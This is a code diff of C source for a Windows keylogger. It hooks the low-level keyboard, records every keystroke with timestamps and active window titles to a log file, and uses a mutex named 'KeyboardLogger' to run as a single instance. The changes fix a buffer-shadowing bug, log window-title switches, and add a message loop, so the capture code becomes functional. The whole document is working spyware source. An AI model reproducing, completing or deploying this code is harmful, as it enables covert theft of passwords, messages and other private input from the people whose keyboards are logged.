@@ -8,7 +8,7 @@ HANDLE	file;
 HHOOK	hook;
 DWORD	prevWinID = NULL;
 CHAR	prevModuleName[MAX_MODULE_NAME],
-		buf[MAX_BUFSIZE];
+		g_buf[MAX_BUFSIZE];
 
 
 BOOL getCharKey(const DWORD vkCode, const DWORD scanCode, LPWORD ch, DWORD winID)
@@ -20,7 +20,7 @@ BOOL getCharKey(const DWORD vkCode, const DWORD scanCode, LPWORD ch, DWORD winID
 
 BOOL getSysKey(const DWORD vkCode)
 {
-	char * buf = buf + strlen(buf);
+	char * buf = g_buf + strlen(g_buf);
 	switch (vkCode)
 	{
 	case VK_F1:			strcpy(buf, "[F1]\r\n"); break;
@@ -66,6 +66,7 @@ BOOL getSysKey(const DWORD vkCode)
 
 LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	GetKeyState(NULL);
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
 		DWORD written;
@@ -75,33 +76,37 @@ LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		DWORD winID = NULL;
 		HWND activeWindow = GetForegroundWindow();
 		GetWindowThreadProcessId(activeWindow, &winID);
-		if (winID != prevWinID)
+		GetWindowText(activeWindow, moduleName, MAX_MODULE_NAME);
+		if (winID != prevWinID || strcmp(moduleName, prevModuleName))
 		{
-			prevWinID = winID; 
-			GetWindowText(activeWindow, moduleName, MAX_MODULE_NAME);
+			prevWinID = winID;
+			strcpy(prevModuleName, moduleName);
 			strcat(moduleName, "\r\n");
 			WriteFile(file, moduleName, strlen(moduleName), &written, NULL);
 		}
 
 		GetLocalTime(&st);
-		GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, buf, MAX_BUFSIZE);
-		strcat(buf, "		");
-		char * buf = buf + strlen(buf);
+		GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, g_buf, MAX_BUFSIZE);
+		strcat(g_buf, "		");
+		char * buf = g_buf + strlen(g_buf);
 		if (getSysKey(ks->vkCode))
 		{
-			WriteFile(file, buf, strlen(buf), &written, NULL);
+			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
 		}
 		else if (getCharKey(ks->vkCode, ks->scanCode, (LPWORD) buf, winID))
 		{
 			strcpy(buf + 1, "\r\n");
-			WriteFile(file, buf, strlen(buf), &written, NULL);
+			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
 		}
 		else
 		{
-			strcat(buf, "[unknown]\r\n");
-			WriteFile(file, buf, strlen(buf), &written, NULL);
+			strcat(g_buf, "[unknown]\r\n");
+			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
 		}
 	}
+
+
+
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
@@ -131,6 +136,8 @@ int main()
 	HANDLE mutex = CreateMutex(NULL, FALSE, "KeyboardLogger");
 	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED) 
 		return 1;
+
+
 	if (!CreateLogFile())
 	{
 		ReleaseMutex(mutex);
@@ -139,7 +146,9 @@ int main()
 	HINSTANCE instance = GetModuleHandle(NULL);
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardHook, instance, 0);
 
-
+	MSG msg;
+	GetMessage(&msg, 0, 0, 0);
+	
 	ReleaseMutex(mutex);
 	UnhookWindowsHookEx(hook);
 	CloseHandle(file);
